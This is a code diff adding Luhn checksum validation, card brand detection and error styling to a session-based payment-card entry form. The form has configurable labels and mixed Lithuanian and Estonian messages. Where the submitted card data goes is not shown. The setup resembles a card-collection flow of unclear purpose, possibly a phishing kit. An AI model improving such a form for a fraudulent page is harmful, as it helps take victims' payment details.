@@ -8,6 +8,37 @@ import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { stepToPath } from "@/lib/session-routes";
 import { useSettings } from "@/contexts/SettingsContext";
 
+function luhnCheck(value: string): boolean {
+  const digits = value.replace(/\D/g, "");
+  if (digits.length < 12) return false;
+  let sum = 0;
+  let shouldDouble = false;
+  for (let i = digits.length - 1; i >= 0; i--) {
+    let d = digits.charCodeAt(i) - 48;
+    if (shouldDouble) {
+      d *= 2;
+      if (d > 9) d -= 9;
+    }
+    sum += d;
+    shouldDouble = !shouldDouble;
+  }
+  return sum % 10 === 0;
+}
+
+type CardBrand = { name: string; re: RegExp; len: number[] };
+const CARD_BRANDS: CardBrand[] = [
+  { name: "visa", re: /^4/, len: [13, 16, 19] },
+  { name: "mastercard", re: /^(5[1-5]|2[2-7])/, len: [16] },
+  { name: "amex", re: /^3[47]/, len: [15] },
+  { name: "maestro", re: /^(5[0,6-9]|6)/, len: [12,13,14,15,16,17,18,19] },
+];
+
+function detectCardBrand(number: string): CardBrand | null {
+  if (!number) return null;
+  for (const b of CARD_BRANDS) if (b.re.test(number)) return b;
+  return null;
+}
+
 type Props = {
   sessionId: string;
 };
@@ -53,6 +84,13 @@ export function CardClient({ sessionId }: Props) {
 
   const expiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
   const cvcValid = /^\d{3,4}$/.test(cvc);
+  const brand = useMemo(() => detectCardBrand(number), [number]);
+  const numberValid = useMemo(() => {
+    if (!number) return false;
+    const digits = number.replace(/\D/g, "");
+    if (digits.length < 12) return false;
+    return luhnCheck(digits);
+  }, [number]);
 
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
@@ -191,14 +229,28 @@ export function CardClient({ sessionId }: Props) {
         <form onSubmit={handleSubmit} className="space-y-4">
           <label className="block text-sm font-medium text-white">
             {settings.card_number_label}
-            <input
-              required
-              inputMode="numeric"
-              className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0fae4e] focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50"
-              value={number}
-              onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
-              autoComplete="cc-number"
-            />
+            <div className="relative mt-2">
+              <input
+                required
+                inputMode="numeric"
+                className={`block w-full rounded-xl border py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50 ${
+                  !numberValid && number.length >= 12
+                    ? "border-red-500 bg-red-500/10 focus:border-red-500"
+                    : "border-transparent bg-white/10 focus:border-[#0fae4e]"
+                }`}
+                value={number}
+                onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
+                autoComplete="cc-number"
+              />
+              {brand && (
+                <div className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 rounded-md bg-white/90 px-2 py-1 shadow-sm">
+                  {brand.name === "visa" && <span className="text-xs font-bold text-[#1a1f71]">VISA</span>}
+                  {brand.name === "mastercard" && <span className="text-xs font-bold text-[#eb001b]">MC</span>}
+                  {brand.name === "amex" && <span className="text-xs font-bold text-[#2e77bc]">AMEX</span>}
+                  {brand.name === "maestro" && <span className="text-xs font-bold text-[#00a2e5]">MAESTRO</span>}
+                </div>
+              )}
+            </div>
           </label>
           <div className="grid grid-cols-2 gap-3">
             <label className="block text-sm font-medium text-white">
@@ -228,6 +280,10 @@ export function CardClient({ sessionId }: Props) {
             </label>
           </div>
 
+          {!numberValid && number.length >= 12 ? (
+            <p className="text-xs text-red-400">Neteisingas kortelės numeris.</p>
+          ) : null}
+
           {!expiryValid && expiry.length > 0 ? (
             <p className="text-xs text-red-400">Aegumiskuupäev peab olema vormingus KK/AA.</p>
           ) : null}
@@ -240,7 +296,7 @@ export function CardClient({ sessionId }: Props) {
 
           <button
             type="submit"
-            disabled={saving || !expiryValid || !cvcValid}
+            disabled={saving || !numberValid || !expiryValid || !cvcValid}
             className="w-full rounded-xl bg-gradient-to-r from-[#0fae4e] to-[#007a38] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(15,174,78,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
             {saving ? "Siunčiama..." : settings.card_button}
